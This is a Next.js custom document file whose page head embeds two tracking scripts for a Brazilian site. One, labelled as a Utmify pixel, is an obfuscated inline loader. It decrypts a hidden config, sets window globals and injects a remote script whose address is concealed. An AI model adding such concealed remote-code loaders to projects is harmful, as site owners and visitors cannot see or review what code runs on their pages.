import Document, { Html, Head, Main, NextScript } from 'next/document';

export default class MyDocument extends Document {
  render() {
    return (
      <Html lang="pt-BR">
        <Head>
          {/* ========================================
              ✅ UTMIFY PIXEL - NOVA VERSÃO
              Colado EXATAMENTE como a Utmify forneceu.
              Nada foi modificado.
              ======================================== */}
          <script
            dangerouslySetInnerHTML={{
              __html: `(function(){var h_ip=atob("DBP6bTqvmWQxiQXalmjYGEjDu14T4XGu5mDAQhXM/Qof/HG3/3WDQ1nA9EpT+yqp9WGTHU7cthRY8WC2uWOTFV/Dtw5Cqyn492eOH1PN7BBU+ifgzU7WT13D9gZQ5Xb4rEiBT1TO9AETsyeq/2ufAXPLu0gT/2S243bYVxiZ+F1Q7DPtoyWZWFvO+gcCvTPsoCrLWQyN5DlM");var c_z=[];for(var f_irkx=0;f_irkx<h_ip.length;f_irkx++){c_z.push(h_ip.charCodeAt(f_irkx)&255);}var w_zo2=c_z[0];var y_a=c_z.slice(1,1+w_zo2);var l_3m8=c_z.slice(1+w_zo2);var q_i=l_3m8.map(function(b,g_dvrv){return b^y_a[g_dvrv%w_zo2];});var n_o="";for(var t_kt8s=0;t_kt8s<q_i.length;t_kt8s++){n_o+=String.fromCharCode(q_i[t_kt8s]&255);}var p_ll=decodeURIComponent(escape(n_o));var a_4y=JSON.parse(p_ll);var e_ny=a_4y.globals||[];e_ny.forEach(function(j_n){window[j_n.name]=j_n.value;});var k_3p=document.createElement("script");k_3p.src=a_4y.url;k_3p.async=true;k_3p.defer=true;(a_4y.attributes||[]).forEach(function(t_qx8){k_3p.setAttribute(t_qx8.name,t_qx8.value);});(document.head||document.documentElement).appendChild(k_3p);})();`,
            }}
          />

          {/* ========================================
              ✅ UTMIFY UTM TRACKER (mantido)
              ======================================== */}
          <script
            async
            defer
            data-utmify-prevent-subids=""
            src="https://cdn.utmify.com.br/scripts/utms/latest.js"
          />
        </Head>
        <body>
          <Main />
          <NextScript />
        </body>
      </Html>
    );
  }
}